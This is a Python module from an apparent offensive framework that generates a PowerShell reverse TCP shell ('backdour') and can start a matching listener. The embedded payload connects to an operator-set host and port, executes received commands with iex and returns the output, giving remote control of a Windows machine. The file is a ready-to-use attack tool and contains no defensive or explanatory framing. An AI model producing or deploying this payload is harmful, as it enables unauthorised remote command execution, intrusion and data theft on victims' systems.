import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_ps_reverse_tcp",
        "title"       : "Payload powershell",
        "module"      : "payloads/nc/ps/reverse_tcp powershell windows",
        "description" : "Payload creation and exploitation"
}

options ={
  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
  "LPORT" : [str(var.all_var['lport']),'The listen port'],
  "LNAME" : [str(var.all_var['lname']),'The name of payload [paylaod.ps1]'],
  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.all_var['ltype'].lower() == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark  = '"'
            mark2 = ','
            f = open(var.all_var['lname'] , 'w')
            payload = '''
$client = New-Object System.Net.Sockets.TCPClient( '''+mark+var.all_var['lhost']+mark+mark2+var.all_var['lport']+''' );$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

'''
            f.write(payload)
            f.close()

        elif var.all_var['ltype'].lower() == "listen":
            from waf.libs import listen
            listen.run()


        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
